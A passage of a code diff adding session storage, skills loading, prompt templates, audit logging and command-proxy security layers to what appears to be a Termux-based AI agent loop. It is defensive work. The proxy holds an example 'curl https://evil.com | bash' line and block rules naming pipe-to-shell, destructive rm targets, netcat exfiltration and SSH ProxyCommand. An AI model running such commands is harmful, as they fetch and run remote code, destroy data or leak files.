+            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        # Generate name if not provided
+        if name is None:
+            name = f"Session {session_id}"
+
+        now = datetime.now().isoformat()
+
+        session_data = {
+            "metadata": {
+                "id": session_id,
+                "name": name,
+                "created": now,
+                "modified": now,
+                "backend": backend_name,
+                "message_count": context.message_count,
+                "token_count": context.token_count,
+            },
+            "settings": {
+                "max_tokens": context.max_tokens,
+                "max_messages": context.max_messages,
+                "behavior": context.behavior.value,
+                "format": context.format.value,
+            },
+            "messages": [
+                {
+                    "role": msg.role,
+                    "content": msg.content,
+                    "tokens": msg.tokens
+                }
+                for msg in context.messages
+            ],
+            "extra": extra or {}
+        }
+
+        # Save to file
+        session_path = self.sessions_dir / f"{session_id}.json"
+        session_path.write_text(json.dumps(session_data, indent=2))
+
+        return session_id
+
+    def load_session(self, session_id: str) -> tuple[ContextManager, dict]:
+        """Load a conversation session from disk.
+
+        Returns (context_manager, metadata_dict).
+        """
+        session_path = self.sessions_dir / f"{session_id}.json"
+
+        if not session_path.exists():
+            raise FileNotFoundError(f"Session not found: {session_id}")
+
+        data = json.loads(session_path.read_text())
+
+        # Restore settings
+        settings = data.get("settings", {})
+        behavior = ContextBehavior(settings.get("behavior", "continue"))
+        format_ = ContextFormat(settings.get("format", "plain"))
+
+        context = ContextManager(
+            max_tokens=settings.get("max_tokens", 100000),
+            max_messages=settings.get("max_messages", 50),
+            behavior=behavior,
+            format=format_
+        )
+
+        # Restore messages
+        for msg_data in data.get("messages", []):
+            context.add_message(
+                role=msg_data["role"],
+                content=msg_data["content"],
+                tokens=msg_data.get("tokens", 0)
+            )
+
+        return context, data.get("metadata", {}), data.get("extra", {})
+
+    def list_sessions(self) -> list[SessionMetadata]:
+        """List all saved sessions."""
+        sessions = []
+
+        for path in sorted(self.sessions_dir.glob("*.json"), reverse=True):
+            try:
+                data = json.loads(path.read_text())
+                meta = data.get("metadata", {})
+                sessions.append(SessionMetadata(
+                    id=meta.get("id", path.stem),
+                    name=meta.get("name", "Unnamed"),
+                    created=meta.get("created", ""),
+                    modified=meta.get("modified", ""),
+                    backend=meta.get("backend", "unknown"),
+                    message_count=meta.get("message_count", 0),
+                    token_count=meta.get("token_count", 0)
+                ))
+            except (json.JSONDecodeError, KeyError):
+                # Skip invalid session files
+                continue
+
+        return sessions
+
+    def delete_session(self, session_id: str) -> bool:
+        """Delete a saved session."""
+        session_path = self.sessions_dir / f"{session_id}.json"
+        if session_path.exists():
+            session_path.unlink()
+            return True
+        return False
+
+    def session_exists(self, session_id: str) -> bool:
+        """Check if a session exists."""
+        session_path = self.sessions_dir / f"{session_id}.json"
+        return session_path.exists()
+
+    def update_session_name(self, session_id: str, new_name: str) -> bool:
+        """Update the name of a saved session."""
+        session_path = self.sessions_dir / f"{session_id}.json"
+        if not session_path.exists():
+            return False
+
+        data = json.loads(session_path.read_text())
+        data["metadata"]["name"] = new_name
+        data["metadata"]["modified"] = datetime.now().isoformat()
+        session_path.write_text(json.dumps(data, indent=2))
+        return True').
+
+py_fragment(skills_module, '"""Skills and agent.md loader for customizing agent behavior."""
+
+from pathlib import Path
+from typing import Any
+
+
+class SkillsLoader:
+    """Loads and combines skills and agent.md files into system prompts."""
+
+    def __init__(self, base_dir: str | Path | None = None):
+        self.base_dir = Path(base_dir) if base_dir else Path.cwd()
+
+    def load_agent_md(self, path: str | Path) -> str:
+        """Load an agent.md file.
+
+        The agent.md file defines the agent\'s persona, capabilities,
+        and default instructions.
+        """
+        full_path = self._resolve_path(path)
+
+        if not full_path.exists():
+            raise FileNotFoundError(f"Agent file not found: {full_path}")
+
+        return full_path.read_text()
+
+    def load_skill(self, path: str | Path) -> str:
+        """Load a single skill file.
+
+        Skill files contain specific instructions for a capability
+        (e.g., git operations, testing, code review).
+        """
+        full_path = self._resolve_path(path)
+
+        if not full_path.exists():
+            raise FileNotFoundError(f"Skill file not found: {full_path}")
+
+        return full_path.read_text()
+
+    def load_skills(self, paths: list[str | Path]) -> list[str]:
+        """Load multiple skill files."""
+        skills = []
+        for path in paths:
+            try:
+                skills.append(self.load_skill(path))
+            except FileNotFoundError as e:
+                print(f"[Warning: {e}]")
+        return skills
+
+    def build_system_prompt(
+        self,
+        base_prompt: str | None = None,
+        agent_md: str | Path | None = None,
+        skills: list[str | Path] | None = None
+    ) -> str:
+        """Build a complete system prompt from components.
+
+        Order:
+        1. agent.md (defines persona and core instructions)
+        2. Skills (specialized capabilities)
+        3. Base prompt (additional instructions/overrides)
+        """
+        parts = []
+
+        # Load agent.md if provided
+        if agent_md:
+            try:
+                content = self.load_agent_md(agent_md)
+                parts.append(content)
+            except FileNotFoundError as e:
+                print(f"[Warning: {e}]")
+
+        # Load skills
+        if skills:
+            skill_contents = self.load_skills(skills)
+            if skill_contents:
+                parts.append("\\n## Skills\\n")
+                for skill in skill_contents:
+                    parts.append(skill)
+                    parts.append("")  # Blank line separator
+
+        # Add base prompt
+        if base_prompt:
+            if parts:
+                parts.append("\\n## Additional Instructions\\n")
+            parts.append(base_prompt)
+
+        return "\\n".join(parts) if parts else ""
+
+    def _resolve_path(self, path: str | Path) -> Path:
+        """Resolve a path relative to base_dir if not absolute."""
+        path = Path(path)
+        if path.is_absolute():
+            return path
+        return self.base_dir / path
+
+
+def create_example_agent_md(path: str | Path):
+    """Create an example agent.md file."""
+    content = """# Coding Assistant
+
+You are a skilled software engineer with expertise in multiple programming languages.
+
+## Principles
+
+- Write clean, readable, maintainable code
+- Follow established conventions and patterns
+- Test your changes when possible
+- Explain your reasoning
+
+## Communication Style
+
+- Be concise and direct
+- Use code examples when helpful
+- Ask clarifying questions when requirements are unclear
+
+## Tools
+
+You have access to:
+- `bash`: Execute shell commands
+- `read`: Read file contents
+- `write`: Create or overwrite files
+- `edit`: Make targeted edits to files
+
+## Process
+
+1. Understand the request
+2. Explore relevant code if needed
+3. Plan the approach
+4. Implement changes
+5. Verify the changes work
+"""
+    Path(path).write_text(content)
+
+
+def create_example_skill(path: str | Path, skill_type: str = "git"):
+    """Create an example skill file."""
+    skills = {
+        "git": """## Git Skill
+
+You are proficient with Git version control.
+
+### Commit Guidelines
+- Write clear, descriptive commit messages
+- Use conventional commit format: type(scope): description
+- Keep commits focused and atomic
+
+### Common Operations
+- Always check `git status` before committing
+- Review diffs before staging changes
+- Pull before pushing to avoid conflicts
+
+### Branch Naming
+- feature/description for new features
+- fix/description for bug fixes
+- docs/description for documentation
+""",
+        "testing": """## Testing Skill
+
+You write thorough tests for code changes.
+
+### Test Types
+- Unit tests for individual functions
+- Integration tests for component interactions
+- End-to-end tests for user workflows
+
+### Best Practices
+- Test both happy path and edge cases
+- Use descriptive test names
+- Keep tests independent and isolated
+- Mock external dependencies
+
+### Commands
+- Run tests with appropriate test runner
+- Check test coverage when available
+""",
+        "code-review": """## Code Review Skill
+
+You perform thorough code reviews.
+
+### Review Checklist
+- [ ] Code is readable and well-structured
+- [ ] No obvious bugs or logic errors
+- [ ] Error handling is appropriate
+- [ ] No security vulnerabilities
+- [ ] Tests cover the changes
+- [ ] Documentation is updated
+
+### Feedback Style
+- Be constructive and specific
+- Explain the "why" behind suggestions
+- Distinguish between required changes and suggestions
+"""
+    }
+
+    content = skills.get(skill_type, skills["git"])
+    Path(path).write_text(content)').
+
+py_fragment(templates_module, '"""Prompt templates for reusable prompt snippets."""
+
+import json
+import re
+from pathlib import Path
+from dataclasses import dataclass
+
+
+# Built-in templates
+BUILTIN_TEMPLATES = {
+    "explain": "Explain the following code in detail:\\n\\n```\\n{code}\\n```",
+    "review": "Please review this code for bugs, security issues, and improvements:\\n\\n```\\n{code}\\n```",
+    "refactor": "Refactor this code to be cleaner and more maintainable:\\n\\n```\\n{code}\\n```",
+    "test": "Write unit tests for this code:\\n\\n```\\n{code}\\n```",
+    "doc": "Add documentation comments to this code:\\n\\n```\\n{code}\\n```",
+    "fix": "Fix the bug in this code:\\n\\n```\\n{code}\\n```\\n\\nError: {error}",
+    "convert": "Convert this {from_lang} code to {to_lang}:\\n\\n```{from_lang}\\n{code}\\n```",
+    "summarize": "Summarize the following in {length} sentences:\\n\\n{text}",
+    "translate": "Translate the following to {language}:\\n\\n{text}",
+    "simplify": "Simplify this explanation for a {audience}:\\n\\n{text}",
+    "debug": "Help me debug this issue:\\n\\nCode:\\n```\\n{code}\\n```\\n\\nExpected: {expected}\\nActual: {actual}",
+    "optimize": "Optimize this code for {goal}:\\n\\n```\\n{code}\\n```",
+    "regex": "Create a regex pattern that matches: {description}",
+    "sql": "Write a SQL query to: {description}",
+    "bash": "Write a bash command to: {description}",
+    "git": "What git commands should I use to: {description}",
+}
+
+
+@dataclass
+class Template:
+    """A prompt template."""
+    name: str
+    template: str
+    description: str = ""
+    variables: list[str] = None
+
+    def __post_init__(self):
+        if self.variables is None:
+            # Extract variables from template
+            self.variables = re.findall(r\'\\{(\\w+)\\}\', self.template)
+
+    def render(self, **kwargs) -> str:
+        """Render the template with provided values."""
+        result = self.template
+        for key, value in kwargs.items():
+            result = result.replace(f"{{{key}}}", str(value))
+        return result
+
+    def missing_variables(self, **kwargs) -> list[str]:
+        """Return list of variables not provided."""
+        return [v for v in self.variables if v not in kwargs]
+
+
+class TemplateManager:
+    """Manages prompt templates."""
+
+    def __init__(self, config_path: str | Path | None = None):
+        self.templates: dict[str, Template] = {}
+        self.config_path = Path(config_path) if config_path else self._default_config_path()
+
+        # Load built-in templates
+        for name, tmpl in BUILTIN_TEMPLATES.items():
+            self.templates[name] = Template(name=name, template=tmpl)
+
+        # Load user templates
+        self._load_user_templates()
+
+    def _default_config_path(self) -> Path:
+        return Path.home() / ".agent-loop" / "templates.json"
+
+    def _load_user_templates(self) -> None:
+        """Load user-defined templates from config file."""
+        if self.config_path.exists():
+            try:
+                data = json.loads(self.config_path.read_text())
+                for name, tmpl_data in data.items():
+                    if isinstance(tmpl_data, str):
+                        self.templates[name] = Template(name=name, template=tmpl_data)
+                    elif isinstance(tmpl_data, dict):
+                        self.templates[name] = Template(
+                            name=name,
+                            template=tmpl_data.get("template", ""),
+                            description=tmpl_data.get("description", "")
+                        )
+            except (json.JSONDecodeError, IOError):
+                pass
+
+    def save_templates(self) -> None:
+        """Save user templates to config file."""
+        self.config_path.parent.mkdir(parents=True, exist_ok=True)
+        # Only save non-builtin templates
+        user_templates = {
+            name: {"template": t.template, "description": t.description}
+            for name, t in self.templates.items()
+            if name not in BUILTIN_TEMPLATES
+        }
+        self.config_path.write_text(json.dumps(user_templates, indent=2))
+
+    def get(self, name: str) -> Template | None:
+        """Get a template by name."""
+        return self.templates.get(name)
+
+    def add(self, name: str, template: str, description: str = "") -> None:
+        """Add or update a template."""
+        self.templates[name] = Template(name=name, template=template, description=description)
+
+    def remove(self, name: str) -> bool:
+        """Remove a template. Returns True if removed."""
+        if name in self.templates and name not in BUILTIN_TEMPLATES:
+            del self.templates[name]
+            return True
+        return False
+
+    def list_templates(self) -> list[Template]:
+        """List all templates."""
+        return sorted(self.templates.values(), key=lambda t: t.name)
+
+    def render(self, name: str, **kwargs) -> str | None:
+        """Render a template with provided values."""
+        template = self.get(name)
+        if template is None:
+            return None
+        return template.render(**kwargs)
+
+    def format_list(self) -> str:
+        """Format templates for display."""
+        lines = ["Templates:"]
+
+        # Built-in
+        lines.append("\\n  Built-in:")
+        for name in sorted(BUILTIN_TEMPLATES.keys()):
+            t = self.templates[name]
+            vars_str = ", ".join(t.variables) if t.variables else "none"
+            lines.append(f"    @{name} ({vars_str})")
+
+        # User-defined
+        user_templates = [t for t in self.templates.values() if t.name not in BUILTIN_TEMPLATES]
+        if user_templates:
+            lines.append("\\n  User-defined:")
+            for t in sorted(user_templates, key=lambda x: x.name):
+                vars_str = ", ".join(t.variables) if t.variables else "none"
+                lines.append(f"    @{t.name} ({vars_str})")
+
+        return "\\n".join(lines)
+
+    def parse_template_invocation(self, text: str) -> tuple[str | None, dict]:
+        """Parse a template invocation like \'@explain code=...\'
+
+        Returns (template_name, kwargs) or (None, {}) if not a template.
+        """
+        if not text.startswith(\'@\'):
+            return None, {}
+
+        parts = text[1:].split(None, 1)
+        if not parts:
+            return None, {}
+
+        name = parts[0]
+        if name not in self.templates:
+            return None, {}
+
+        kwargs = {}
+        if len(parts) > 1:
+            # Parse key=value pairs or use remaining as first variable
+            rest = parts[1]
+            template = self.templates[name]
+
+            # Check for key=value format
+            kv_pattern = r\'(\\w+)=(?:"([^"]*)"|(\\S+))\'
+            matches = re.findall(kv_pattern, rest)
+
+            if matches:
+                for key, quoted, unquoted in matches:
+                    kwargs[key] = quoted if quoted else unquoted
+            elif template.variables:
+                # Use rest as the first variable
+                kwargs[template.variables[0]] = rest
+
+        return name, kwargs
+
+
+def create_default_templates_file(path: str | Path | None = None) -> Path:
+    """Create a default templates file for user customization."""
+    path = Path(path) if path else Path.home() / ".agent-loop" / "templates.json"
+    path.parent.mkdir(parents=True, exist_ok=True)
+
+    example = {
+        "mytemplate": {
+            "template": "Do something with {input}",
+            "description": "Example custom template"
+        },
+        "pr": {
+            "template": "Create a pull request description for these changes:\\n\\n{changes}",
+            "description": "Generate PR description"
+        }
+    }
+
+    path.write_text(json.dumps(example, indent=2))
+    return path').
+
+py_fragment(security_audit_module, '"""Audit logging for agent loop security events.
+
+Writes JSONL (one JSON object per line) to session-specific log files.
+Three verbosity levels:
+  - basic:    commands, tool calls, security violations
+  - detailed: + file access, API calls, cost tracking
+  - forensic: + command output, environment, timing
+"""
+
+import json
+import os
+import time
+from pathlib import Path
+from typing import Any
+
+
+class AuditLogger:
+    """JSONL audit logger for agent loop sessions."""
+
+    def __init__(self, log_dir: str | None = None, level: str = \'basic\'):
+        if log_dir:
+            self.log_dir = Path(log_dir)
+        else:
+            self.log_dir = Path(os.path.expanduser(\'~/.agent-loop/audit\'))
+        self.level = level  # basic, detailed, forensic
+        self._session_id: str | None = None
+        self._log_file: Path | None = None
+        self._enabled = level != \'disabled\'
+
+    def start_session(self, session_id: str, user_id: str = \'\',
+                      security_profile: str = \'\') -> None:
+        """Begin logging for a new session."""
+        if not self._enabled:
+            return
+        self.log_dir.mkdir(parents=True, exist_ok=True)
+        self._session_id = session_id
+        timestamp = time.strftime(\'%Y%m%d-%H%M%S\')
+        self._log_file = self.log_dir / f\'{timestamp}-{session_id}.jsonl\'
+        self._write({
+            \'event\': \'session_start\',
+            \'session_id\': session_id,
+            \'user_id\': user_id,
+            \'security_profile\': security_profile,
+        })
+
+    def end_session(self) -> None:
+        """End the current session."""
+        if not self._enabled or not self._session_id:
+            return
+        self._write({\'event\': \'session_end\', \'session_id\': self._session_id})
+        self._session_id = None
+        self._log_file = None
+
+    # ── Event logging methods ─────────────────────────────────────────────
+
+    def log_command(self, command: str, allowed: bool,
+                    reason: str | None = None,
+                    output: str | None = None) -> None:
+        """Log a bash command execution attempt."""
+        if not self._enabled:
+            return
+        entry: dict[str, Any] = {
+            \'event\': \'command\',
+            \'command\': command,
+            \'allowed\': allowed,
+        }
+        if reason:
+            entry[\'reason\'] = reason
+        if output is not None and self.level == \'forensic\':
+            # Truncate large outputs
+            entry[\'output\'] = output[:4096]
+        self._write(entry)
+
+    def log_file_access(self, path: str, operation: str, allowed: bool,
+                        reason: str | None = None,
+                        bytes_count: int = 0) -> None:
+        """Log a file read/write/edit attempt."""
+        if not self._enabled:
+            return
+        if self.level == \'basic\':
+            # basic level only logs blocked file access
+            if allowed:
+                return
+        entry: dict[str, Any] = {
+            \'event\': \'file_access\',
+            \'path\': path,
+            \'operation\': operation,
+            \'allowed\': allowed,
+        }
+        if reason:
+            entry[\'reason\'] = reason
+        if bytes_count and self.level in (\'detailed\', \'forensic\'):
+            entry[\'bytes\'] = bytes_count
+        self._write(entry)
+
+    def log_tool_call(self, tool_name: str, success: bool,
+                      args_summary: str = \'\') -> None:
+        """Log a tool call execution."""
+        if not self._enabled:
+            return
+        entry: dict[str, Any] = {
+            \'event\': \'tool_call\',
+            \'tool\': tool_name,
+            \'success\': success,
+        }
+        if args_summary:
+            entry[\'args\'] = args_summary[:512]
+        self._write(entry)
+
+    def log_security_violation(self, rule: str, severity: str,
+                               details: dict[str, Any] | None = None) -> None:
+        """Log a security rule violation."""
+        if not self._enabled:
+            return
+        entry: dict[str, Any] = {
+            \'event\': \'security_violation\',
+            \'rule\': rule,
+            \'severity\': severity,
+        }
+        if details:
+            entry[\'details\'] = details
+        self._write(entry)
+
+    def log_api_call(self, backend: str, model: str,
+                     tokens: int = 0, cost: float = 0.0) -> None:
+        """Log an API call with cost info."""
+        if not self._enabled:
+            return
+        if self.level == \'basic\':
+            return
+        self._write({
+            \'event\': \'api_call\',
+            \'backend\': backend,
+            \'model\': model,
+            \'tokens\': tokens,
+            \'cost\': cost,
+        })
+
+    def log_proxy_action(self, command: str, proxy_name: str,
+                         action: str, reason: str = \'\') -> None:
+        """Log a command proxy intercept."""
+        if not self._enabled:
+            return
+        entry: dict[str, Any] = {
+            \'event\': \'proxy_action\',
+            \'command\': command[:512],
+            \'proxy\': proxy_name,
+            \'action\': action,
+        }
+        if reason:
+            entry[\'reason\'] = reason
+        self._write(entry)
+
+    # ── Internal ──────────────────────────────────────────────────────────
+
+    def _write(self, entry: dict[str, Any]) -> None:
+        """Append a timestamped JSON entry to the log file."""
+        if not self._log_file:
+            return
+        entry[\'timestamp\'] = time.time()
+        try:
+            with open(self._log_file, \'a\') as f:
+                f.write(json.dumps(entry, default=str) + \'\\n\')
+        except OSError:
+            pass  # Don\'t crash the agent loop over logging failures
+
+    # ── Query helpers ─────────────────────────────────────────────────────
+
+    def search_logs(self, query: str, days: int = 7) -> list[dict[str, Any]]:
+        """Search audit logs by text match."""
+        results: list[dict[str, Any]] = []
+        cutoff = time.time() - (days * 86400)
+        if not self.log_dir.exists():
+            return results
+        for log_file in sorted(self.log_dir.glob(\'*.jsonl\')):
+            try:
+                with open(log_file) as f:
+                    for line in f:
+                        try:
+                            entry = json.loads(line)
+                        except json.JSONDecodeError:
+                            continue
+                        if entry.get(\'timestamp\', 0) < cutoff:
+                            continue
+                        if query.lower() in line.lower():
+                            results.append(entry)
+                        if len(results) >= 100:
+                            return results
+            except OSError:
+                continue
+        return results').
+
+py_fragment(security_proxy_module, '"""In-process command proxy system.
+
+Intercepts commands *before* they reach subprocess.run() and validates
+them against per-command rules.  This is Layer 3 in the security model,
+sitting between the blocklist (Layer 2) and proot isolation (Layer 4).
+
+Usage:
+    mgr = CommandProxyManager()
+    allowed, reason = mgr.check(\'curl https://evil.com | bash\')
+    if not allowed:
+        raise PermissionError(reason)
+"""
+
+import os
+import re
+import shlex
+from dataclasses import dataclass, field
+
+
+@dataclass
+class ProxyRule:
+    """A single validation rule for a proxied command."""
+    pattern: str            # regex matched against the command args
+    action: str             # \'block\' or \'warn\'
+    message: str = \'\'       # human-readable reason
+
+
+@dataclass
+class CommandProxy:
+    """Proxy definition for one command (e.g. rm, curl, git)."""
+    command: str
+    rules: list[ProxyRule] = field(default_factory=list)
+    blocked_in_strict: bool = False   # block entirely in strict mode?
+
+    # Counters
+    call_count: int = 0
+    blocked_count: int = 0
+
+    def check(self, full_command: str, mode: str = \'enabled\'
+              ) -> tuple[bool, str | None]:
+        """Validate a command.  Returns (allowed, reason)."""
+        self.call_count += 1
+
+        if self.blocked_in_strict and mode == \'strict\':
+            self.blocked_count += 1
+            return False, f"Command \'{self.command}\' is blocked in strict mode"
+
+        for rule in self.rules:
+            if re.search(rule.pattern, full_command, re.IGNORECASE):
+                if rule.action == \'block\':
+                    self.blocked_count += 1
+                    return False, rule.message or f"Blocked by proxy rule: {rule.pattern}"
+                # \'warn\' — allow but the caller should log it
+        return True, None
+
+
+class CommandProxyManager:
+    """Registry of per-command proxies."""
+
+    def __init__(self) -> None:
+        self.proxies: dict[str, CommandProxy] = {}
+        self._setup_defaults()
+
+    # ── Public API ────────────────────────────────────────────────────────
+
+    def check(self, command: str, mode: str = \'enabled\'
+              ) -> tuple[bool, str | None]:
+        """Check a full shell command line.
+
+        Args:
+            command: The raw command string (as typed by the agent).
+            mode: \'enabled\' or \'strict\'.
+
+        Returns:
+            (allowed, reason).  reason is None when allowed.
+        """
+        cmd_name = self._extract_command_name(command)
+        if not cmd_name:
+            return True, None
+
+        proxy = self.proxies.get(cmd_name)
+        if proxy is None:
+            return True, None
+
+        return proxy.check(command, mode)
+
+    def add_proxy(self, proxy: CommandProxy) -> None:
+        """Register or replace a command proxy."""
+        self.proxies[proxy.command] = proxy
+
+    # ── Default proxies ───────────────────────────────────────────────────
+
+    def _setup_defaults(self) -> None:
+        # rm — block catastrophic deletes
+        # Include the expanded $HOME path so tilde expansion doesn\'t
+        # bypass the literal ~ rule.  Also block the Termux prefix
+        # since on Android the real /usr, /etc are read-only but the
+        # Termux prefix (/data/data/com.termux/files/usr) is writable.
+        home = os.path.expanduser(\'~\')
+        home_escaped = re.escape(home)
+        # Detect Termux prefix (parent of $HOME, typically
+        # /data/data/com.termux/files)
+        termux_prefix = os.environ.get(
+            \'PREFIX\', \'/data/data/com.termux/files/usr\')
+        termux_base = os.path.dirname(termux_prefix)  # .../files
+        termux_base_escaped = re.escape(termux_base)
+        self.proxies[\'rm\'] = CommandProxy(\'rm\', rules=[
+            ProxyRule(
+                r\'-[rf]*\\s+/$\',
+                \'block\', "Cannot rm the root filesystem"),
+            ProxyRule(
+                r\'-[rf]*\\s+/home\\b\',
+                \'block\', "Cannot rm /home"),
+            ProxyRule(
+                r\'-[rf]*\\s+~/?$\',
+                \'block\', "Cannot rm home directory"),
+            ProxyRule(
+                rf\'-[rf]*\\s+{home_escaped}/?$\',
+                \'block\', "Cannot rm home directory (expanded path)"),
+            ProxyRule(
+                rf\'-[rf]*\\s+{termux_base_escaped}/(usr|home)\\b\',
+                \'block\', "Cannot rm Termux system directories"),
+            ProxyRule(
+                r\'-[rf]*\\s+/etc\\b\',
+                \'block\', "Cannot rm /etc"),
+            ProxyRule(
+                r\'-[rf]*\\s+/usr\\b\',
+                \'block\', "Cannot rm /usr"),
+        ])
+
+        # curl / wget — block pipe-to-shell and dangerous writes
+        for cmd in (\'curl\', \'wget\'):
+            self.proxies[cmd] = CommandProxy(cmd, rules=[
+                ProxyRule(
+                    r\'\\|\\s*(ba)?sh\',
+                    \'block\', f"Cannot pipe {cmd} output to shell"),
+                ProxyRule(
+                    r\'\\|\\s*python\',
+                    \'block\', f"Cannot pipe {cmd} output to python"),
+                ProxyRule(
+                    r\'\\|\\s*eval\',
+                    \'block\', f"Cannot pipe {cmd} output to eval"),
+                ProxyRule(
+                    r\'-o\\s+/etc/\',
+                    \'block\', f"Cannot write {cmd} output to /etc/"),
+            ])
+
+        # python3 — block dangerous inline execution
+        for cmd in (\'python\', \'python3\'):
+            self.proxies[cmd] = CommandProxy(cmd, rules=[
+                ProxyRule(
+                    r\'-c\\s.*os\\.system\',
+                    \'block\', "Cannot use os.system() in inline python"),
+                ProxyRule(
+                    r\'-c\\s.*subprocess\',
+                    \'block\', "Cannot use subprocess in inline python"),
+                ProxyRule(
+                    r\'-c\\s.*__import__\\s*\\(\\s*[\\\'"]os\',
+                    \'block\', "Cannot import os in inline python"),
+                ProxyRule(
+                    r\'-c\\s.*eval\\s*\\(\',
+                    \'block\', "Cannot use eval() in inline python"),
+                ProxyRule(
+                    r\'-c\\s.*exec\\s*\\(\',
+                    \'block\', "Cannot use exec() in inline python"),
+            ])
+
+        # git — warn on write operations, block in strict
+        self.proxies[\'git\'] = CommandProxy(\'git\', rules=[
+            ProxyRule(r\'\\bpush\\b\', \'warn\', "git push detected"),
+            ProxyRule(r\'\\bpull\\b\', \'warn\', "git pull detected"),
+            ProxyRule(r\'\\bmerge\\b\', \'warn\', "git merge detected"),
+            ProxyRule(r\'\\breset\\s+--hard\', \'block\', "git reset --hard is blocked"),
+            ProxyRule(r\'\\bclean\\s+-f\', \'block\', "git clean -f is blocked"),
+            ProxyRule(r\'\\bpush\\s+.*--force\', \'block\', "git force push is blocked"),
+        ])
+
+        # ssh — block in strict mode entirely, block ProxyCommand always
+        self.proxies[\'ssh\'] = CommandProxy(\'ssh\', blocked_in_strict=True, rules=[
+            ProxyRule(
+                r\'-o\\s*ProxyCommand\',
+                \'block\', "SSH ProxyCommand is blocked"),
+        ])
+
+        # scp — block in strict mode
+        self.proxies[\'scp\'] = CommandProxy(\'scp\', blocked_in_strict=True)
+
+        # nc / netcat — block in strict mode (potential data exfil)
+        for cmd in (\'nc\', \'netcat\', \'ncat\'):
+            self.proxies[cmd] = CommandProxy(cmd, blocked_in_strict=True)
+
+    # ── Helpers ───────────────────────────────────────────────────────────
+
+    @staticmethod
+    def _extract_command_name(command: str) -> str | None:
+        """Extract the base command name from a shell command line.
+
+        Handles env prefixes, paths, sudo, etc.
+        """
+        stripped = command.strip()
+        if not stripped:
+            return None
+
+        # Skip common prefixes
+        prefixes = (\'env \', \'sudo \', \'nice \', \'nohup \', \'time \')
+        while True:
+            matched = False
+            for prefix in prefixes:
+                if stripped.lower().startswith(prefix):
+                    stripped = stripped[len(prefix):].lstrip()
+                    matched = True
+                    break
+            if not matched:
+                break
+
+        # Skip env VAR=val assignments
+        while \'=\' in stripped.split()[0] if stripped else False:
+            parts = stripped.split(None, 1)
+            if len(parts) < 2:
+                return None
+            stripped = parts[1]
+
+        # Get first token and extract basename
+        try:
+            first = shlex.split(stripped)[0]
+        except ValueError:
+            first = stripped.split()[0] if stripped.split() else \'\'
+
+        # /usr/bin/python3 -> python3
+        if \'/\' in first:
+            first = first.rsplit(\'/\', 1)[-1]
+
+        return first or None').
+
+py_fragment(security_path_proxy_module, '"""PATH-based command proxy layer.
+
+Generates wrapper scripts in ~/.agent-loop/bin/ that shadow dangerous
+commands.  When enabled, these scripts are prepended to PATH so that
+even if the in-process proxy misses something (e.g. inside a piped
+command or shell script), the wrapper catches it at exec time.
+
+This is Layer 3.5 in the security model — between the in-process
+proxy (Layer 3) and proot isolation (Layer 4).
+"""
+
+import os
+import stat
+from pathlib import Path
+from dataclasses import dataclass, field
+
+from typing import TYPE_CHECKING
+if TYPE_CHECKING:
+    from .proxy import CommandProxyManager, CommandProxy
+
+
+class PathProxyManager:
+    """Manages wrapper scripts in ~/.agent-loop/bin/."""
+
+    DEFAULT_BIN_DIR = os.path.expanduser(\'~/.agent-loop/bin\')
+
+    def __init__(self, bin_dir: str | None = None):
+        self.bin_dir = Path(bin_dir or self.DEFAULT_BIN_DIR)
+        self._generated: set[str] = set()
+
+    def generate_wrappers(self, proxy_mgr: \'CommandProxyManager\') -> list[str]:
+        """Auto-generate wrapper scripts from CommandProxyManager rules.
+
+        Returns list of command names for which wrappers were created.
+        """
+        self.bin_dir.mkdir(parents=True, exist_ok=True)
+        generated = []
+
+        for cmd_name, proxy in proxy_mgr.proxies.items():
+            script = self._build_wrapper(cmd_name, proxy)
+            path = self.bin_dir / cmd_name
+            path.write_text(script)
+            path.chmod(stat.S_IRWXU)  # 0o700
+            generated.append(cmd_name)
+            self._generated.add(cmd_name)
+
+        return generated
+
+    def build_env(self, base_env: dict[str, str] | None = None,
+                  proxy_mode: str = \'enabled\',
+                  audit_log: str | None = None) -> dict[str, str]:
+        """Build environment dict with our bin dir prepended to PATH.
+
+        Args:
+            base_env: Starting environment (default: os.environ copy).
+            proxy_mode: \'enabled\' or \'strict\' — passed to wrappers.
+            audit_log: Optional path to JSONL audit log for wrapper logging.
+
+        Returns:
+            New env dict suitable for subprocess.run(env=...).
+        """
+        env = dict(base_env or os.environ)
+        current_path = env.get(\'PATH\', \'\')
+        bin_str = str(self.bin_dir)
+        # Don\'t double-prepend
+        if not current_path.startswith(bin_str + \':\'):
+            env[\'PATH\'] = f\'{bin_str}:{current_path}\'
+        env[\'AGENT_LOOP_PROXY_MODE\'] = proxy_mode
+        if audit_log:
+            env[\'AGENT_LOOP_AUDIT_LOG\'] = audit_log
+        return env
+
+    def cleanup(self) -> None:
+        """Remove all generated wrapper scripts."""
+        for cmd_name in list(self._generated):
+            script = self.bin_dir / cmd_name
+            if script.exists():
+                script.unlink()
+            self._generated.discard(cmd_name)
+
+    def status(self) -> dict:
+        """Return diagnostic info."""
+        wrappers = []
+        if self.bin_dir.exists():
+            wrappers = sorted(
+                f.name for f in self.bin_dir.iterdir()
+                if f.is_file() and os.access(f, os.X_OK)
+            )
+        return {
+            \'bin_dir\': str(self.bin_dir),
+            \'exists\': self.bin_dir.exists(),
+            \'wrappers\': wrappers,
+            \'generated\': sorted(self._generated),
+        }
+
+    # ── Internal ──────────────────────────────────────────────────────────
+
+    def _build_wrapper(self, cmd_name: str, proxy: \'CommandProxy\') -> str:
+        """Build a bash wrapper script for a single command.
+
+        The wrapper:
+        1. Finds the REAL binary by searching PATH excluding our bin dir
+        2. Checks the full command against block-action rules
+        3. If blocked: prints reason to stderr, exits 126
+        4. If allowed: exec\'s the real binary with all original args
+        """
+        # Build rule checks (only \'block\' rules — \'warn\' just logs)
+        checks = []
+        for rule in proxy.rules:
+            if rule.action != \'block\':
+                continue
+            # Escape single quotes for embedding in bash
+            pattern = rule.pattern.replace("\'", "\'\\\\\'\'")
+            message = (rule.message or f\'Blocked: {rule.pattern}\').replace("\'", "\'\\\\\'\'")
+            checks.append(
+                f\'if echo "$FULL_CMD" | grep -qiP -- \\\'{pattern}\\\'; then\\n\'
+                f\'  echo "[PATH-Proxy] {message}" >&2\\n\'
+                f\'  exit 126\\n\'
+                f\'fi\'
+            )
+
+        checks_block = \'\\n\'.join(checks) if checks else \': # no block rules\'
+
+        # Strict-mode full block
+        strict_block = \'\'
+        if proxy.blocked_in_strict:
+            strict_block = (
+                \'if [ "$AGENT_LOOP_PROXY_MODE" = "strict" ]; then\\n\'
